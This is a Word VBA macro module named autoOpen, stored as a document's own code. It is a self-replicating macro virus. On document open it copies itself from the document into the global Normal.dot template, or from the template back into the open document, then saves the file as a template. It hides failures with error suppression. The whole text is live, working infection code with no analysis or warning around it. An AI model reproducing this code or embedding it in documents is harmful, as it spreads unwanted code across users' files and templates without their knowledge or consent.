   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim fileMacro$
   Dim globMacro$
   Dim MacroFile$
   On Error GoTo -1: On Error GoTo Caught
   WordBasic.FileSummaryInfo Update:=1
   Dim d1lg As Object: Set d1lg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo d1lg

   fileMacro$ = d1lg.Directory + "\" + d1lg.FileName + ":autoOpen"
   globMacro$ = "Global:autoOpen"
   MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

   If MacroFile$ = "NORMAL.DOT" Then
       WordBasic.MacroCopy globMacro$, fileMacro$
       WordBasic.FileSaveAs Format:=1
   Else
       WordBasic.MacroCopy fileMacro$, globMacro$
   End If

   Caught:
       On Error GoTo -1: On Error GoTo 0

   End Sub
